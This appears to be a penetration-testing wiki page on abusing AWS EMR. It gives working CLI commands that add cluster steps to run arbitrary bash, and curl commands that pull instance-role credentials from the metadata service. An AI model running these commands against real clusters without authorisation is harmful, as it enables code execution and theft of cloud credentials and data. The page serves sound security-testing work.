---
title: "EMR: cluster steps and the instance role"
description: "Abusing EMR clusters, steps, and the instance role to run code and read data across the cluster."
keywords:
  - EMR
  - cluster
  - step
  - instance role
  - Hadoop
---

# EMR

EMR runs managed Hadoop and Spark clusters, each on EC2 instances that carry an **instance role** (usually `EMR_EC2_DefaultRole`) with broad S3 access to the job data. Two levers matter: adding a **step** runs arbitrary code on the cluster, and reaching the master node gives a shell as the instance role whose credentials come from IMDS.

## Finding clusters and adding a step

```bash
aws emr list-clusters --active
aws emr describe-cluster --cluster-id <id> \
  --query 'Cluster.[Ec2InstanceAttributes.IamInstanceProfile,LogUri]'

# run code on the cluster as a step
aws emr add-steps --cluster-id <id> --steps \
  'Type=CUSTOM_JAR,Jar=command-runner.jar,Args=[bash,-c,"id;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'
```

## Taking the instance role

```bash
# on the master node (SSH or step), read the role credentials from IMDS
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Exploitation notes

- The EMR instance role commonly has wide S3 read/write for the job inputs and outputs, so taking it reaches the lake data and often more.
- Steps run as the cluster user with the instance role available through IMDS, which is the escalation even without SSH.
- Cluster logs in the configured `LogUri` S3 bucket can themselves leak data and arguments.

## Tools

- **AWS CLI** (`emr list-clusters`, `add-steps`, `describe-cluster`).

## References

- [AWS: EMR IAM roles](https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-iam-roles.html)
- [HackTricks Cloud: AWS EMR](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Pacu: AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
